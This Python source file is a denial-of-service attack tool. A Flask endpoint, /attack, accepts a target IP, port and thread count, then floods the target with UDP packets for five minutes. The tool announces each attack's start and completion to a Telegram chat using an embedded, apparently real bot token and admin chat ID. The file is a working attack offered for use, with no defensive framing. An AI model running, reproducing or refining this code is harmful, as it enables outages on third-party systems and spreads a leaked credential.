import socket
import threading
import time
import signal
import sys
import requests
from flask import Flask, request

app = Flask(__name__)

# Define the text to append
TEXT = "Sahil IP"
PAYLOAD = TEXT.encode('utf-8')

# Hardcoded values for duration
DURATION = 300  # Duration of the flood in seconds

# Telegram Bot Token and Admin ID (Replace with your actual values)
TELEGRAM_BOT_TOKEN = "7263360382:AAGXuphmy7-ypdsqlC-5jG05QKNwIjnWbnU"  # Replace with your Telegram bot token
ADMIN_ID = "6512242172"  # Replace with your Telegram admin ID

class UDPFlood:
    def __init__(self, ip, port, duration):
        self.ip = ip
        self.port = port
        self.duration = duration

    def send_telegram_message(self, message):
        """Sends a message to the specified Telegram chat."""
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": ADMIN_ID,
            "text": message,
            "parse_mode": "Markdown"
        }
        try:
            requests.post(url, data=payload)
        except Exception as e:
            print(f"Failed to send message to Telegram: {e}")

    def attack_thread(self):
        """Function for the thread to send UDP packets continuously."""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        endtime = time.time() + self.duration
        
        while time.time() <= endtime:
            try:
                sock.sendto(PAYLOAD, (self.ip, self.port))
            except Exception as e:
                print(f"Send failed: {e}")
                break
        
        sock.close()

def handle_sigint(sig, frame):
    """Handle Ctrl+C to stop the attack."""
    print("\nStopping attack...")
    sys.exit(0)

@app.route('/attack', methods=['POST'])
def attack():
    """Start an attack from Telegram webhook."""
    data = request.json
    target_ip = data.get('ip')
    target_port = data.get('port')
    num_threads = data.get('threads')

    # Inform admin via Telegram when attack starts
    telegram_message_start = (
        f"🎇 Attack Sent Successfully! 🎇\n\n"
        f"🎯 Target: {target_ip}\n"
        f"🔌 Port: {target_port}\n"
        f"⏳ Threads: {num_threads}\n\n"
        f"🚀 Your attack will finish in {DURATION // 60} minutes. "
        f"Please wait here without touching any button... 🚀"
    )

    print(telegram_message_start)
    UDPFlood(target_ip, target_port, DURATION).send_telegram_message(telegram_message_start)

    threads = []

    # Create and start all threads
    for _ in range(num_threads):
        udp_flood = UDPFlood(target_ip, target_port, DURATION)
        thread = threading.Thread(target=udp_flood.attack_thread)
        thread.start()
        threads.append(thread)

    # Wait for all threads to finish
    for thread in threads:
        thread.join()

    # Inform admin via Telegram when attack completes
    telegram_message_end = (
        "🎉 COMPLETE ATTACK🔻\n\n"
        f"💢 Target -> {target_ip}\n"
        f"💢 Port: {target_port}\n"
        f"💢 Threads: {num_threads}\n"
    )

    print(telegram_message_end)
    UDPFlood(target_ip, target_port, DURATION).send_telegram_message(telegram_message_end)

    return "Attack started", 200

if __name__ == "__main__":
    # Setup signal handling
    signal.signal(signal.SIGINT, handle_sigint)

    app.run(host='0.0.0.0', port=5000)  # Run Flask app
```

